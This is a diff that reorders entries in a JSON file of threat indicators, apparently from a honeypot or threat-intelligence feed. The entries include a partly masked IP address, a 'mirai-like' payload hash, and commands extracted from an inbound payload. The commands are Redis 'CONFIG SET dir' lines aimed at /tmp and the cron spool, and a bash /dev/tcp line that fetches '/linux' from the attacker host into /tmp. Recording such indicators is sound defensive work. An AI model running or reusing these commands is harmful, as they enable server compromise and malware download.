@@ -6,22 +6,16 @@
     "value": "203.57.109.XXX"
   },
   {
-    "context": "Inbound payload hash (mirai-like)",
-    "source": "static_analysis",
-    "type": "hash",
-    "value": "d9e0abbd818e17dae5a8c8ad4c6d0d58abd467446e1016d1d0121bb366852a8d"
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "config set dir /var/spool/cron/"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "CONFIG SET dir /tmp/"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "config set dir /var/spool/cron/"
   },
   {
     "context": "Suspicious command in inbound payload",
@@ -34,6 +28,12 @@
     "source": "strings",
     "type": "command",
     "value": "system.exec \"bash -c \\\"exec 6<>/dev/tcp/203.57.109.XXX/60114 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/YWsxIHrj2d &"
+  },
+  {
+    "context": "Inbound payload hash (mirai-like)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "d9e0abbd818e17dae5a8c8ad4c6d0d58abd467446e1016d1d0121bb366852a8d"
   },
   {
     "asn": "Beijing Volcano Engine Technology Co., Ltd.",
